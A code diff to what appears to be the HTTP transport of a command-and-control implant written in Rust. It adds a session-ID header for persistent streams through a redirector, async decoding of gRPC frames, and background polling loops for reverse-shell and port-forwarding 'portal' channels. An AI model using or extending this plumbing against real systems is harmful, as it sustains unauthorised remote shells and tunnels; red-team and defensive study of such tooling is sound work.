@@ -177,6 +177,10 @@ impl HTTP {
         Req: Message + Send + 'static,
         Resp: Message + Default + Send + 'static,
     {
+        // Generate a unique session ID so the redirector can maintain a persistent
+        // gRPC stream across multiple HTTP short-poll requests.
+        let session_id = uuid::Uuid::new_v4().to_string();
+
         loop {
             // Buffer to hold messages to send in this polling interval
             let mut messages = Vec::new();
@@ -216,10 +220,11 @@ impl HTTP {
                 request_body.extend_from_slice(&request_bytes);
             }
 
-            // Build and send the HTTP request
+            // Build and send the HTTP request with session header for persistent stream routing
             let uri = self.build_uri(path)?;
             let req = self
                 .request_builder(uri)
+                .header("X-Stream-Session-Id", &session_id)
                 .body(hyper_legacy::Body::from(request_body.freeze()))
                 .context("Failed to build HTTP request")?;
 
@@ -233,13 +238,40 @@ impl HTTP {
                 }
             };
 
-            // Stream and process response frames
-            let result = Self::stream_grpc_frames::<Req, Resp, _>(response, |response_msg| {
-                tx.blocking_send(response_msg).map_err(|err| {
-                    anyhow::anyhow!("Failed to send response through channel: {}", err)
-                })
-            })
-            .await;
+            // Read entire response body then decode gRPC frames and send via async channel.
+            // We cannot use stream_grpc_frames here because its handler closure is synchronous,
+            // and tokio::sync::mpsc::Sender requires async send (blocking_send panics in async context).
+            let body_bytes = Self::read_response_body(response).await;
+            let result: Result<()> = match body_bytes {
+                Ok(bytes) => {
+                    let mut buffer = BytesMut::from(bytes.as_ref());
+                    let mut send_err = None;
+                    while let Some((_header, encrypted_message)) =
+                        grpc_frame::FrameHeader::extract_frame(&mut buffer)
+                    {
+                        match unmarshal_with_codec::<Req, Resp>(&encrypted_message) {
+                            Ok(response_msg) => {
+                                if let Err(err) = tx.send(response_msg).await {
+                                    send_err = Some(anyhow::anyhow!(
+                                        "Failed to send response through channel: {}",
+                                        err
+                                    ));
+                                    break;
+                                }
+                            }
+                            Err(err) => {
+                                send_err = Some(err);
+                                break;
+                            }
+                        }
+                    }
+                    match send_err {
+                        Some(err) => Err(err),
+                        None => Ok(()),
+                    }
+                }
+                Err(err) => Err(err),
+            };
 
             if let Err(err) = result {
                 #[cfg(debug_assertions)]
@@ -627,8 +659,20 @@ impl Transport for HTTP {
         rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
         tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
     ) -> Result<()> {
-        self.handle_short_poll_streaming(rx, tx, REVERSE_SHELL_PATH)
-            .await
+        // Spawn polling loop in background and return immediately.
+        // The caller (pty.rs) expects reverse_shell() to return so the input
+        // handling loop can run concurrently, matching the gRPC transport behavior.
+        let transport = self.clone();
+        tokio::spawn(async move {
+            if let Err(_err) = transport
+                .handle_short_poll_streaming(rx, tx, REVERSE_SHELL_PATH)
+                .await
+            {
+                #[cfg(debug_assertions)]
+                log::error!("reverse_shell short poll streaming ended: {}", _err);
+            }
+        });
+        Ok(())
     }
 
     async fn create_portal(
@@ -636,8 +680,19 @@ impl Transport for HTTP {
         rx: tokio::sync::mpsc::Receiver<CreatePortalRequest>,
         tx: tokio::sync::mpsc::Sender<CreatePortalResponse>,
     ) -> Result<()> {
-        self.handle_short_poll_streaming(rx, tx, CREATE_PORTAL_PATH)
-            .await
+        // Spawn polling loop in background and return immediately,
+        // matching the gRPC transport behavior.
+        let transport = self.clone();
+        tokio::spawn(async move {
+            if let Err(_err) = transport
+                .handle_short_poll_streaming(rx, tx, CREATE_PORTAL_PATH)
+                .await
+            {
+                #[cfg(debug_assertions)]
+                log::error!("create_portal short poll streaming ended: {}", _err);
+            }
+        });
+        Ok(())
     }
 
     fn get_type(&mut self) -> pb::c2::transport::Type {
